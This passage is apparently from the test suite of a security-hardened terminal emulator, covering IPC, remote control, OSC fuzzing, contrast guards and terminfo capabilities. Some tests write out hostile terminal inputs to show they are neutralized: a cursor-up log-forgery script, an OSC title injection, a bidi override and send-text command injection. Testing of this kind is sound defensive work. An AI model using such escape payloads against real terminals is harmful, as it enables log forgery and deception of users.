_lk = MainWindow(launch=_pla([]))
_lk._locked = frozenset({'osc_clipboard_read', 'bell', 'colors'})
_lk._open_launch_tab({'osc': ['osc_clipboard_read'], 'bell': 'audible',
                      'colors': True, 'command': ['sleep', '30']})
pump(80)
_lkt = _lk.current()
ok(not _lkt.osc_enabled('osc_clipboard_read'),
   'launch: an admin lock overrides a CLI --osc override')
eq(_lkt.bell_channels(), _lk._default_bell,
   'launch: an admin lock overrides a CLI --bell override')
_lk.close()

# an unknown / bogus --osc feature is ignored (never crashes, never enables)
_lb = MainWindow(launch=_pla(['--osc', 'not_a_feature', '--', 'sleep', '30']))
pump(80)
ok(not _lb.current().osc_enabled('not_a_feature') if
   hasattr(_lb.current(), 'osc_enabled') else True,
   'launch: an unknown --osc feature is ignored')
_lb.close()

# --- single-instance IPC: a running instance opens a client's tabs ------------
import threading                                       # noqa: E402
from secure_terminal.main import _launch_to_request    # noqa: E402
from secure_terminal import ipc as _ipc                # noqa: E402
os.environ['XDG_RUNTIME_DIR'] = tempfile.mkdtemp()     # isolated socket dir
srvwin = MainWindow(launch=_pla([]))
srvwin.start_instance_server('default')
pump(150)
ok(os.path.exists(_ipc.socket_path('default')), 'ipc: server bound its socket')
eq(oct(os.stat(_ipc.socket_path('default')).st_mode & 0o777), '0o700',
   'ipc: socket is owner-only (0700)')
_before = srvwin.tabs.count()
_res = {}


def _client():
    spec = _pla(['--title', 'fromclient', '--', 'sleep', '30'])
    _res['reply'] = _ipc.send_request('default', _launch_to_request(spec))


_th = threading.Thread(target=_client)
_th.start()
for _ in range(300):                                   # pump so the server answers
    pump(10)
    if not _th.is_alive():
        break
_th.join()
eq(_res.get('reply', {}).get('ok'), True, 'ipc: client open request accepted')
eq(srvwin.tabs.count(), _before + 1, 'ipc: the running instance opened the tab')
ok(any(srvwin.tabs.tabText(i) == 'fromclient' for i in range(srvwin.tabs.count())),
   'ipc: opened tab carries the client title')
# a malformed op is refused, not crashed
eq(srvwin._dispatch_request(b'{"op":"bogus"}').get('ok'), False,
   'ipc: unknown op refused')
eq(srvwin._dispatch_request(b'not json').get('ok'), False, 'ipc: bad json refused')
# remote control is OFF here (no admin conf) -> ctl ops refused
eq(srvwin._dispatch_request(b'{"op":"ctl-ls"}').get('ok'), False,
   'ctl: refused when remote_control is off')
srvwin.close()

# --- remote control (ctl), enabled by a privileged config ---------------------
_rcsys = tempfile.mkdtemp(prefix='st-rcsys-')
with open(os.path.join(_rcsys, '90_rc.conf'), 'w') as _f:
    _f.write('remote_control=true\n')
_o_sys2 = settings._system_dirs
settings._system_dirs = lambda: [_rcsys]
try:
    rcwin = MainWindow(launch=_pla(['--title', 'main']))
    pump(120)
    ok(rcwin._remote_control, 'ctl: privileged remote_control=true enables it')
    _lsr = rcwin._dispatch_request(b'{"op":"ctl-ls"}')
    ok(_lsr.get('ok') and _lsr['tabs'][0]['title'] == 'main', 'ctl: ls lists tabs')
    _t = spy_writes(rcwin.current())
    rcwin.current()._line_dirty = False
    _sr = rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:main","text":"ok\\n"}')
    # Delivered as a PASTE: sanitized, then the TRAILING submit is stripped, so a
    # `send-text $'cmd\n'` injection cannot auto-run cmd at the prompt; it waits
    # there for the user's own Enter. The line is marked unverifiable.
    ok(_sr.get('ok') and _t == [b'ok'],
       'ctl: send-text sanitizes but never auto-submits (no trailing CR)')
    ok(rcwin.current()._line_dirty,
       'ctl: send-text marks the line unverifiable')
    # a control character in send-text is dropped by the sanitizer
    _t2 = spy_writes(rcwin.current())
    rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"id:0","text":"a\\u001bb"}')
    ok(_t2 == [b'ab'], 'ctl: send-text strips an escape (no injection)')
    rcwin._dispatch_request(
        b'{"op":"ctl-set-tab-title","tab":"id:0","title":"renamed"}')
    eq(rcwin.tabs.tabText(0), 'renamed', 'ctl: set-tab-title renames the tab')
    eq(rcwin._dispatch_request(
        b'{"op":"ctl-send-text","tab":"title:nope","text":"x"}').get('ok'), False,
        'ctl: an unmatched tab is an error')
    # dump-tab: read back a tab's current rendered text (for E2E assertions). Do NOT pump
    # between the append and the dump: the tab runs the real login shell, whose prompt
    # arrives asynchronously via the pty, and an event-loop turn here would let that prompt
    # land AFTER 'gamma' and end the document with the prompt instead (a flake seen under
    # coverage's slowdown). transcript_text() flushes any pending paint itself, so the dump
    # sees the appended text with no pump; without a pump no _on_readable can run to insert
    # a late prompt.
    rcwin.current()._append('alpha\nbeta\ngamma')
    _dr = rcwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}')
    ok(_dr.get('ok') and _dr['text'].endswith('gamma'), 'ctl: dump-tab reads the tab text')
    _dr2 = rcwin._dispatch_request(
        b'{"op":"ctl-dump-tab","tab":"id:0","lines":1}')
    eq(_dr2.get('text'), 'gamma', 'ctl: dump-tab --lines returns the tail')
    rcwin.close()
finally:
    settings._system_dirs = _o_sys2

# dump-tab is gated like the other ctl ops
_o_sys3 = settings._system_dirs
settings._system_dirs = lambda: [tempfile.mkdtemp()]      # no remote_control
try:
    offwin = MainWindow(launch=_pla([]))
    pump(60)
    eq(offwin._dispatch_request(b'{"op":"ctl-dump-tab","tab":"id:0"}').get('ok'),
       False, 'ctl: dump-tab refused when remote control is off')
    offwin.close()
finally:
    settings._system_dirs = _o_sys3

# --- cat-over-ssh: sanitization is at the render layer, so the byte SOURCE is
# irrelevant. A malicious file cat'd on a REMOTE host over ssh reaches the local
# terminal as the same pty byte stream a local program would emit, and is
# sanitized the same. We prove it end to end by having a subprocess emit exactly
# what a remote `cat evil-file` would deliver (the git-diffs-lie / Trojan-Source
# bytes) and asserting the rendered document is safe.
import tempfile as _tf2                                  # noqa: E402
_evil = os.path.join(_tf2.mkdtemp(prefix='st-ssh-'), 'cat_evil.sh')
with open(_evil, 'w') as _f:
    # printf writes raw bytes to stdout, exactly as `cat` of a crafted file over
    # ssh would. The cursor-up + erase-line tries to reach the EARLIER line and
    # overwrite it -- the classic log-forgery. \033 is ESC.
    _f.write('#!/bin/sh\n'
             "printf 'SECRET_REAL_OUTPUT\\n'\n"
             "printf '\\033[1A\\033[2KHIDDEN_FAKE\\n'\n"   # up+erase the line above
             "printf '\\033]0;pwned\\007visible-text\\n'\n"  # OSC title injection
             "printf 'admin \\342\\200\\256nimda\\342\\200\\254 bidi\\n'\n"
             'sleep 30\n')
os.chmod(_evil, 0o700)
ssh = SecureTerminal(command=_evil)          # stands in for: ssh host cat evil
ssh.resize(700, 300)
ssh.show()
pump(500)
_doc = ssh.toPlainText()
ok('\x1b' not in _doc, 'ssh/cat: no escape byte survives to the document')
ok('\x9b' not in _doc and '\x07' not in _doc, 'ssh/cat: no C1 / BEL survives')
ok(chr(0x202e) not in _doc, 'ssh/cat: the bidi override is neutralized')
# the cursor-UP is stripped, so the forgery cannot reach the EARLIER line: the
# real output survives (a program can only rewrite its own current line).
ok('SECRET_REAL_OUTPUT' in _doc,
   'ssh/cat: cross-line forgery prevented (cursor-up cannot hide earlier output)')
ok('visible-text' in _doc, 'ssh/cat: honest visible text is shown')
ok('pwned' not in _doc, 'ssh/cat: the OSC-0 title-injection payload is stripped')
ssh.shutdown()

# --- fuzz the Qt-side request parsers (owner-only socket, but still defensive) -
from hypothesis import given as _given, strategies as _hst   # noqa: E402
from hypothesis import settings as _hset                     # noqa: E402
from secure_terminal.main import _sanitize_tab_spec          # noqa: E402
_HRUN = _hset(max_examples=150, deadline=None)


@_HRUN
@_given(_hst.dictionaries(
    _hst.text(max_size=12),
    _hst.one_of(_hst.none(), _hst.text(max_size=32), _hst.booleans(),
                _hst.integers(), _hst.lists(_hst.text(max_size=8), max_size=4))))
def _fuzz_tab_spec(spec):
    out = _sanitize_tab_spec(spec)
    assert set(out) == {'title', 'tui', 'mode', 'command',
                        'colors', 'line_edits', 'bell', 'osc'}
    assert out['title'] is None or isinstance(out['title'], str)
    assert out['tui'] is None or isinstance(out['tui'], bool)
    assert out['mode'] is None or isinstance(out['mode'], str)
    assert out['colors'] is None or isinstance(out['colors'], bool)
    assert out['line_edits'] is None or isinstance(out['line_edits'], bool)
    assert out['bell'] is None or isinstance(out['bell'], str)
    assert out['osc'] is None or (isinstance(out['osc'], list)
                                  and all(isinstance(f, str) for f in out['osc']))


try:
    _fuzz_tab_spec()
    ok(True, 'fuzz: _sanitize_tab_spec validates arbitrary IPC tab specs')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _sanitize_tab_spec raised: %s' % _e)

_fw = MainWindow(launch=_pla([]))


@_HRUN
@_given(_hst.binary(max_size=256))
def _fuzz_dispatch(payload):
    reply = _fw._dispatch_request(payload)
    assert isinstance(reply, dict) and 'ok' in reply


try:
    _fuzz_dispatch()
    ok(True, 'fuzz: _dispatch_request handles arbitrary IPC bytes without crashing')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'fuzz: _dispatch_request raised: %s' % _e)
_fw.close()

# fuzz: the TUI OSC handler must be chunk-boundary invariant -- an OSC fed whole
# vs split at any point must fire the SAME action (the OSC-split-across-reads bug
# class). One reused terminal; reset the OSC carry between the two runs.
_ofz = SecureTerminal(command='/bin/cat', tui=True)
_ofz.apply_osc('osc_notify', True)
_ofz.apply_osc('osc_cwd', True)


@_HRUN
@_given(_hst.text(alphabet=_hst.characters(min_codepoint=32, max_codepoint=126),
                  max_size=48),
        _hst.integers(min_value=0, max_value=52))
def _fuzz_osc_split(body, split):
    seq = b'\x1b]9;' + body.encode('ascii') + b'\x07'
    _ofz._osc_carry = b''
    whole = []
    _cw = _ofz.notified.connect(lambda s: whole.append(s))
    _ofz._handle_osc(seq)
    _ofz.notified.disconnect(_cw)
    _ofz._osc_carry = b''
    parts = []
    _cs = _ofz.notified.connect(lambda s: parts.append(s))
    _ofz._handle_osc(seq[:split])
    _ofz._handle_osc(seq[split:])
    _ofz.notified.disconnect(_cs)
    assert whole == parts


@_HRUN
@_given(_hst.binary(max_size=64))
def _fuzz_osc7_safe(raw):
    # any OSC 7 path emitted to the tab tooltip is fully safe (a percent-decoded
    # bidi/zero-width/control byte can never reach it)
    body = raw.replace(b'\x07', b'').replace(b'\x1b', b'')
    _ofz._osc_carry = b''
    _ofz._reported_cwd = ''
    got = []
    _c = _ofz.cwd_changed.connect(lambda p: got.append(p))
    _ofz._handle_osc(b'\x1b]7;file://h/' + body + b'\x07')
    _ofz.cwd_changed.disconnect(_c)
    for _p in got:
        assert _S.render_output(_p, 'box') == _p    # already safe: nothing to strip


for _name, _prop in (('osc_split', _fuzz_osc_split), ('osc7_safe', _fuzz_osc7_safe)):
    try:
        _prop()
        ok(True, 'fuzz: OSC handler %s invariant holds' % _name)
    except Exception as _e:            # pylint: disable=broad-except
        ok(False, 'fuzz: OSC handler %s: %s' % (_name, _e))
_ofz.close()

# --- adversarial: OSC split-invariance BEYOND OSC 9 + no split-smuggled write --
# An OSC of ANY code fed whole vs split at any offset must have the SAME observable
# effect, crucially the SAME write-backs -- so an attacker cannot smuggle a
# reflection / injection through a chunk boundary. Extends the OSC-9-only notify
# test to title/palette/cwd/hyperlink/clipboard/colour-query codes, and asserts on
# the WRITE spy (the injection-relevant channel), not just a signal.
_osz = SecureTerminal(command='/bin/cat')
for _f in ('osc_title', 'osc_notify', 'osc_cwd', 'osc_hyperlink', 'osc_clipboard'):
    try:
        _osz.apply_osc(_f, True)
    except Exception:                  # pylint: disable=broad-except
        pass                           # feature may not exist; the sweep still runs


def _osc_writes(seq_parts):
    _osz._osc_carry = b''
    captured = []
    _orig = _osz._write
    _osz._write = captured.append      # pylint: disable=protected-access
    try:
        for part in seq_parts:
            _osz._handle_osc(part)
    finally:
        _osz._write = _orig
    return captured


@_HRUN
@_given(_hst.sampled_from((0, 1, 2, 4, 7, 8, 9, 10, 11, 52, 104)),
        _hst.text(alphabet=_hst.characters(min_codepoint=32, max_codepoint=126),
                  max_size=40),
        _hst.integers(min_value=0, max_value=48))
def _prop_osc_split_writeback(code, body, split):
    seq = b'\x1b]' + str(code).encode('ascii') + b';' + body.encode('ascii') + b'\x07'
    whole = _osc_writes([seq])
    parts = _osc_writes([seq[:split], seq[split:]])
    assert whole == parts, 'code=%d split=%d: whole=%r split=%r' % (
        code, split, whole, parts)


try:
    _prop_osc_split_writeback()
    ok(True, 'adversarial: OSC split-invariance holds across codes (no write smuggled '
             'through a chunk boundary)')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'adversarial: OSC split-invariance: %s' % _e)
_osz.close()

# --- adversarial: the contrast guard holds for the WHOLE attacker colour space --
# The guard must keep text readable for ANY program-chosen fg/bg -- a palette index,
# a 256-colour, or a 24-bit truecolour, on either theme -- not just the one
# black-on-dark case. The attacker picks the colours, so the invariant (final fg is
# never near-invisible against its effective bg) must survive every pick.
from secure_terminal.terminal import THEMES as _THEMES, _rgb as _rgb_of  # noqa: E402
from secure_terminal.sanitize import too_close as _too_close             # noqa: E402
from PyQt6.QtGui import QColor as _QColor2                                # noqa: E402

_cg = SecureTerminal(command='/bin/cat')
_cg.apply_colors(True)
_colorval = _hst.one_of(
    _hst.none(),
    _hst.integers(min_value=0, max_value=15),
    _hst.builds(lambda r, g, b: '#%02x%02x%02x' % (r, g, b),
                _hst.integers(0, 255), _hst.integers(0, 255), _hst.integers(0, 255)))


@_HRUN
@_given(_colorval, _colorval, _hst.booleans(), _hst.sampled_from(('dark', 'light')))
def _prop_contrast_guard(fg_i, bg_i, bold, theme):
    _cg.apply_theme(theme)
    fmt = _cg._format_for({'fg': fg_i, 'bg': bg_i, 'bold': bold})
    fg_brush = fmt.foreground()
    if fg_brush.style() == Qt.BrushStyle.NoBrush:
        return                         # nothing coloured -> invariant N/A
    base_bg = _THEMES.get(theme, _THEMES['dark'])[0]
    bg_brush = fmt.background()
    bg = (bg_brush.color() if bg_brush.style() != Qt.BrushStyle.NoBrush
          else _QColor2(base_bg))
    assert not _too_close(_rgb_of(fg_brush.color()), _rgb_of(bg)), (
        'fg=%r bg=%r theme=%s -> unreadable' % (fg_i, bg_i, theme))


try:
    _prop_contrast_guard()
    ok(True, 'adversarial: the contrast guard keeps text readable for ANY program '
             'colours (palette / 256 / truecolour, both themes)')
except Exception as _e:                # pylint: disable=broad-except
    ok(False, 'adversarial: contrast guard failed: %s' % _e)

# --- exhaustive + deterministic: EVERY ANSI palette combination (line mode) ----
# The hypothesis sweep above samples the truecolour space; this pass ENUMERATES
# the realistic attack surface with no randomness -- each of the 16 ANSI palette
# colours (and the default) as fg against each as bg, bold on and off, on both
# themes -- and asserts the invariant on every single one: the final foreground is
# never near-invisible against its effective background. Deterministic, so a
# regression can never slip through on a lucky seed.
def _eff_pair(fmt, theme):
    _fgb = fmt.foreground()
    if _fgb.style() == Qt.BrushStyle.NoBrush:
        return None
    _base_bg = _THEMES.get(theme, _THEMES['dark'])[0]
    _bgb = fmt.background()
    _bg = (_bgb.color() if _bgb.style() != Qt.BrushStyle.NoBrush
           else _QColor2(_base_bg))
    return _rgb_of(_fgb.color()), _rgb_of(_bg)

_line_checked = 0
_line_bad = []
for _theme in ('dark', 'light'):
    _cg.apply_theme(_theme)
    for _fg in list(range(16)) + [None]:
        for _bg in list(range(16)) + [None]:
            for _bold in (False, True):
                _pair = _eff_pair(
                    _cg._format_for({'fg': _fg, 'bg': _bg, 'bold': _bold}), _theme)
                if _pair is None:
                    continue
                _line_checked += 1
                if _too_close(*_pair):
                    _line_bad.append((_theme, _fg, _bg, _bold))
ok(not _line_bad,
   'contrast(line): every ANSI fg x bg x bold x theme stays readable '
   '(%d combos checked, unreadable: %r)' % (_line_checked, _line_bad[:3]))

# a program cannot hide text by painting fg == bg for ANY palette index either.
_hide_bad = []
for _theme in ('dark', 'light'):
    _cg.apply_theme(_theme)
    for _i in range(16):
        _pair = _eff_pair(_cg._format_for({'fg': _i, 'bg': _i, 'bold': False}), _theme)
        if _pair and _too_close(*_pair):
            _hide_bad.append((_theme, _i))
ok(not _hide_bad,
   'contrast(line): fg==bg for every palette index is forced readable (bad: %r)' % _hide_bad)
_cg.close()

# --- configurable window keyboard shortcuts -----------------------------------
# Every window shortcut is registered (documented) and rebindable, with conflict
# detection; only non-default overrides are persisted. Terminal control keys are
# NOT in this registry (they always go to the program).
ok(len(win._shortcuts) >= 14, 'all window shortcuts are registered for the dialog')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'a shortcut has its default binding')
eq(win._set_shortcuts({'new_tab': 'Ctrl+Alt+N'}), [], 'a rebind applies with no conflict')
eq(win.act_new.shortcut().toString(), 'Ctrl+Alt+N', 'the action takes the new binding')
eq(win._keybindings.get('new_tab'), 'Ctrl+Alt+N', 'a non-default binding is stored as an override')
win._set_shortcuts({'new_tab': 'Ctrl+Shift+T'})
ok('new_tab' not in win._keybindings, 'reverting to the default drops the override')
_kc = win._set_shortcuts({'copy': 'Ctrl+Shift+J', 'paste': 'Ctrl+Shift+J'})
ok(bool(_kc), 'two actions on one combination is reported as a conflict')
eq(win.act_copy.shortcut().toString(), 'Ctrl+Shift+C',
   'a conflicting rebind applies nothing (copy keeps its binding)')
# a bare Ctrl+<letter> is reserved for the terminal (Ctrl+U/R reach the program)
ok(bool(win._set_shortcuts({'new_tab': 'Ctrl+U'})),
   'binding a window action to a terminal control key is rejected')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'the reserved rebind applied nothing')
ok(bool(win._set_shortcuts({'new_tab': 'A'})),
   'binding to a bare printable key (which would eat typing) is rejected')
# a built-in default that happens to be Ctrl+<letter> is grandfathered in, so
# only a USER-set bare Ctrl+<letter> is rejected.
eq(win._set_shortcuts({'quit': 'Ctrl+Q', 'new_tab': 'Ctrl+Alt+T'}), [],
   'a default Ctrl+Q and a Ctrl+Alt combo are accepted')
win._set_shortcuts({'new_tab': 'Ctrl+Shift+T'})       # restore default
# an admin lock on keybindings refuses edits entirely
_saved_locked = win._locked
win._locked = set(win._locked) | {'keybindings'}
ok(bool(win._set_shortcuts({'new_tab': 'Ctrl+Alt+Z'})),
   'a locked keybindings setting refuses edits')
eq(win.act_new.shortcut().toString(), 'Ctrl+Shift+T', 'the locked edit applied nothing')
win._locked = _saved_locked

# --- New Tab: CLI vs TUI mode chosen at creation (#69) ------------------------
_saved_dtui = win._default_tui
win._default_tui = False
win.new_tab(tui=False)
ok(win.current()._tui is False, 'new_tab(tui=False) opens a CLI-mode tab')
ok(win.act_new_cli.isEnabled(), 'the New Tab (CLI) action is always available')
win.new_tab(tui=True)
ok(win.current()._tui is True, 'new_tab(tui=True) opens a TUI-mode tab')
ok(win.act_new_tui.isEnabled(), 'New Tab (TUI) is always available')
# the default variant follows the window default, not a forced mode
win._default_tui = False
win.new_tab()
ok(win.current()._tui is False, 'plain new_tab() uses the window default (CLI)')
win._default_tui = _saved_dtui

# an override loaded from config is honoured at build time via _bind()
_kb = MainWindow()
_kb._keybindings = {'close_tab': 'Ctrl+Alt+W'}
from PyQt6.QtGui import QAction as _QAction        # noqa: E402
_probe = _QAction('&Close Tab', _kb)
_kb._bind(_probe, 'close_tab', 'Ctrl+Shift+W')
eq(_probe.shortcut().toString(), 'Ctrl+Alt+W', '_bind applies a config override over the default')
_kb.close()

# --- OSC handler robustness (codex follow-up) --------------------------------
_oh = SecureTerminal(command='/bin/cat', tui=True)
_oh.apply_osc('osc_hyperlink', True)
_oh.apply_osc('osc_notify', True)
_links = []
_oh.notified.connect(lambda s: _links.append(s))
# OSC 8 hyperlink with an ST (ESC \) terminator, not just BEL, must be surfaced
_oh._handle_osc(b'\x1b]8;;https://example.com/a\x1b\\click\x1b]8;;\x1b\\')
ok(any('https://example.com/a' in s for s in _links),
   'OSC 8 hyperlink with an ST terminator is surfaced')
# an OSC split across two reads (a 64KiB clipboard is guaranteed to) is still acted on
_links.clear()
_oh._handle_osc(b'\x1b]9;hello ')                 # incomplete -> held as carry
_oh._handle_osc(b'world\x07')                     # completes it on the next read
ok(any('hello world' in s for s in _links), 'an OSC split across PTY reads is still acted on')
_oh.close()

# OSC 7 cwd: a percent-encoded bidi/zero-width char is sanitized before the tooltip
_o7 = SecureTerminal(command='/bin/cat', tui=True)
_o7.apply_osc('osc_cwd', True)
_paths = []
_o7.cwd_changed.connect(lambda p: _paths.append(p))
_o7._handle_osc(b'\x1b]7;file://host/home/%E2%80%AE/x\x07')     # %E2%80%AE = U+202E RLO
_rlo = chr(0x202E)                                # bidi override, kept out of source
ok(_paths and all(_rlo not in p for p in _paths),
   'OSC 7 percent-decoded path is sanitized (no bidi override reaches the tooltip)')
_o7.close()

# restored history is capped so entering TUI cannot synchronously replay a huge scrollback
_big = SecureTerminal(command='/bin/cat', history='x' * 2_000_000)
ok(len(_big._raw) <= _big._RAW_MAX, 'restored history is capped to _RAW_MAX')
_big.close()

# an alternate-screen flood is bounded (per-read snapshot cap), does not hang
if tui_available():
    _af = SecureTerminal(command='/bin/cat', tui=True)
    _af._make_screen()
    _af._feed_stream(b'\x1b[?1049h\x1b[?1049l' * 1000)         # 2000 transitions
    ok(True, 'an alternate-screen flood returns (bounded) rather than hanging')
    _af.close()

# a legacy allow_title lock also locks the granular title/notify controls
_saved_l = win._locked
win._locked = set(win._locked) | {'allow_title'}
win._osc_defaults['osc_notify'] = False
win.set_osc('osc_notify', True)
ok(not win._osc_defaults['osc_notify'],
   'a legacy allow_title lock refuses granular title/notify edits')
win._locked = _saved_l

# session dump carries the full per-tab OSC map, not just the allow_title boolean
_stabs = win._session_tabs()
ok(_stabs and isinstance(_stabs[0].get('osc'), dict) and 'osc_clipboard' in _stabs[0]['osc'],
   'session persists the full per-tab OSC feature map')

# an explicit granular osc_notify=false survives a restart even with legacy
# allow_title=true present (the fallback must not clobber an explicit value)
_cfgdir = os.path.join(os.environ['XDG_CONFIG_HOME'], 'secure-terminal.d')
os.makedirs(_cfgdir, exist_ok=True)
_ucfg = os.path.join(_cfgdir, '50_user.conf')
with open(_ucfg, 'w', encoding='utf-8') as _fh:
    _fh.write('allow_title=true\nosc_title=true\nosc_notify=false\n')
_wd = MainWindow()
ok(_wd._osc_defaults['osc_title'] and not _wd._osc_defaults['osc_notify'],
   'legacy allow_title does not override an explicit granular osc_notify=false')
_wd.close()
os.remove(_ucfg)                                  # restore the empty test config

# --- opt-in restricted CLI terminfo -------------------------------------------
import secure_terminal.terminal as _timod                          # noqa: E402
_tdir = _timod.cli_terminfo_dir()
ok(_tdir and os.path.isfile(os.path.join(_tdir, 's', 'secure-terminal')),
   'the restricted terminfo entry compiles/resolves')
# TERM is per-MODE: CLI advertises the restricted secure-terminal entry (so a
# program lists completions plainly and never draws an in-place menu line mode
# cannot show); TUI advertises xterm-256color (full caps for full-screen apps +
# ssh). The dir is returned in BOTH modes so TERMINFO_DIRS resolves either entry
# across a live switch (apply_tui re-exports TERM without restarting the shell).
_ttc = SecureTerminal(command='/bin/cat')                  # CLI mode (default)
eq(_ttc._child_term(), ('secure-terminal', _tdir),
   'CLI mode advertises the restricted TERM (no completion-menu redraws)')
_ttc.close()
_ttt = SecureTerminal(command='/bin/cat', tui=True)        # TUI mode
_term, _d = _ttt._child_term()
eq(_term, 'xterm-256color', 'TUI mode advertises xterm-256color (full caps)')
ok(_d == _tdir, 'TERMINFO_DIRS resolves the restricted entry in both modes')
_ttt.close()
# line_edits=false STRIPS the four line-local ops, so the shell must not be told
# they work: CLI then advertises the -noedit entry, which cancels el/el1/cuf/cuf1/
# cub/hpa. Advertising them would have the shell emit redraws we drop on the floor.
_tne = SecureTerminal(command='/bin/cat', line_edits=False)
eq(_tne._child_term(), ('secure-terminal-noedit', _tdir),
   'CLI mode with line editing off advertises the append-only TERM entry')
_tne.close()
# TUI is unaffected: the confined screen model interprets escapes either way.
_tnt = SecureTerminal(command='/bin/cat', tui=True, line_edits=False)
eq(_tnt._child_term()[0], 'xterm-256color',
   'TUI mode is unaffected by line_edits')
_tnt.close()
# the entry cancels every capability-query cap (no probing) + cursor-addressing +
# alternate screen -- assert at the source of truth (the .ti)
_ti = _timod._terminfo_source()
ok(_ti and os.path.isfile(_ti), 'the terminfo source ships')
with open(_ti, encoding='utf-8') as _tih2:
    _ti_src = _tih2.read()
ok('secure-terminal-noedit|' in _ti_src,
   'the terminfo source declares the append-only entry')
for _cap in ('el@', 'el1@', 'cuf@', 'cuf1@', 'cub@', 'hpa@'):
    ok(_cap in _ti_src.split('secure-terminal-noedit|', 1)[-1],
       'the append-only entry cancels %s' % _cap)
# cub1 is \b, a raw control byte honored in BOTH settings -- cancelling it would
# over-restrict, so it must NOT appear in the cancelled set.
ok('cub1@' not in _ti_src,
   'cub1 (backspace) is never cancelled -- it is honored either way')
with open(_ti, encoding='utf-8') as _tih:
    _ti_txt = _tih.read()
ok(all(cap in _ti_txt for cap in ('u6@', 'u7@', 'u8@', 'u9@', 'RV@',
                                  'cup@', 'smcup@', 'rmcup@', 'clear@')),
   'the entry cancels the query + cursor-addressing + alt-screen caps')

# --- CLASH: the ADVERTISED capability set vs what the renderer actually does ---
# The two entries are a PROMISE to the shell, made over the terminfo protocol, and
# the renderer is what keeps it. The cancel-list greps above are a hand-written
# list, so a capability INHERITED from xterm-16color and never thought about is
# invisible to them. Enumerate the compiled entries instead and hold every
# surviving capability to the renderer's real behaviour, in BOTH line_edits
# states. This is what catches the promise the two features break together.
import subprocess as _sp                                            # noqa: E402
from secure_terminal.sanitize import feed_line_edits as _fle        # noqa: E402
from secure_terminal.sanitize import cells_to_runs as _c2r          # noqa: E402
# ncurses itself does the parameter expansion (via tput), so the bytes checked
# are the bytes a real program emits. Deliberately NOT the curses module: an
# in-process setupterm/tparm segfaults this Qt suite.


def _entry_caps(entry):
    """name -> expanded escape string, for every STRING capability the compiled
    `entry` advertises."""
    env = dict(os.environ, TERMINFO=_tdir, TERM=entry)
    out = _sp.run(['infocmp', '-1', '-x', entry], env=env, check=True,
                  capture_output=True, text=True, timeout=15).stdout
    caps = {}
    for line in out.splitlines():
        line = line.strip().rstrip(',')
        if line.startswith('#') or '=' not in line:
            continue
        name, _, value = line.partition('=')
        nparams = 0
        for n in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
            if '%p' + n in value:
                nparams = max(nparams, int(n))
        args = [name] + ['1'] * nparams
        got = _sp.run(['tput', '-T', entry] + args, env=env, check=False,
                      capture_output=True, timeout=15)
        if got.returncode == 0 and got.stdout:
            caps[name] = got.stdout.decode('latin-1')
    return caps


def _renders_to(text, line_edits):
    """What the CLI cell model puts on screen for `text`."""
    comp, cells, _col, _sgr, wraps = _fle([], 0, {}, text, 0, line_edits)
    runs, _p = _c2r(comp, cells, 'detail', False, wraps=wraps)
    return ''.join(t for t, _k in runs)


_CAPS_EDIT = _entry_caps('secure-terminal')
_CAPS_NOEDIT = _entry_caps('secure-terminal-noedit')
ok(len(_CAPS_EDIT) > 20 and len(_CAPS_NOEDIT) > 20,
   'the compiled entries enumerate their capabilities')

# 1. No surviving capability may expand to an OSC or DCS introducer. Every OSC
# feature is neutralized by default and DCS is always stripped, so advertising
# one promises a side effect that is dropped on the floor (Cs/Cr were OSC 12/112
# cursor colour; xr was the DCS xterm version query).
for _entry, _caps in (('secure-terminal', _CAPS_EDIT),
                      ('secure-terminal-noedit', _CAPS_NOEDIT)):
    _osc = sorted(n for n, v in _caps.items() if '\x1b]' in v or '\x1bP' in v)
    eq(_osc, [], '%s advertises no OSC/DCS capability' % _entry)

# 2. Every advertised capability that emits an ESCAPE must be CONSUMED whole --
# it may move the cursor or set a colour, but it must put no glyph on screen. A
# capability the stripper does not match leaks its body as unmarked text, which
# is how the charset designators (smacs=ESC ( 0, and ESC ( B from every sgr0)
# used to print "(0" / "(B".
# k* capabilities are the INPUT side (bytes the terminal sends when a key is
# pressed), never program output, so they are not the renderer's to consume.
for _entry, _caps, _le in (('secure-terminal', _CAPS_EDIT, True),
                           ('secure-terminal-noedit', _CAPS_NOEDIT, False)):
    _leaky = sorted(n for n, v in _caps.items()
                    if not n.startswith('k') and '\x1b' in v
                    and _renders_to(v, _le) != '')
    eq(_leaky, [], '%s: every escape-emitting capability renders no glyph' % _entry)

# 3. The two-way lock between the cursor/erase family and the renderer. An
# advertised op MUST be honoured (or the shell's redraw silently does nothing);
# a cancelled op MUST NOT be (or line_edits=false is append-only in name only).
# Both directions matter: this is the clash the -noedit entry exists to prevent.
# cap -> (its escape, a probe whose render CHANGES when the op is honoured).
# The forward moves are probed after a backward one: with no line width, cursor
# forward clamps to end-of-line, so at the margin it is a no-op either way and
# the probe would prove nothing.
_CURSOR_FAMILY = {
    'cuf': ('\x1b[2C', 'abcdef\x1b[4D\x1b[2CX'),
    'cuf1': ('\x1b[C', 'abcdef\x1b[4D\x1b[CX'),
    'cub': ('\x1b[2D', 'abc\x1b[2DX'),
    'hpa': ('\x1b[2G', 'abc\x1b[2GX'),
    'el': ('\x1b[K', 'abcdef\x1b[3G\x1b[K'),
    'el1': ('\x1b[1K', 'abc\x1b[1K'),
}
for _entry, _caps, _le in (('secure-terminal', _CAPS_EDIT, True),
                           ('secure-terminal-noedit', _CAPS_NOEDIT, False)):
    for _cap, (_esc, _probe) in _CURSOR_FAMILY.items():
        _acted = _renders_to(_probe, _le) != _renders_to(
            _probe.replace(_esc, ''), _le)
        eq(_acted, _cap in _caps,
           '%s: %s is honoured by the renderer exactly when advertised'
           % (_entry, _cap))

# cub1 is \b -- a raw control byte, honoured in BOTH settings, so it must stay
# advertised in both. (Cancelling it would over-restrict; keeping it while the
# renderer ignored it would be the same clash in reverse.)
for _entry, _caps, _le in (('secure-terminal', _CAPS_EDIT, True),
                           ('secure-terminal-noedit', _CAPS_NOEDIT, False)):
    ok('cub1' in _caps, '%s advertises cub1 (backspace)' % _entry)
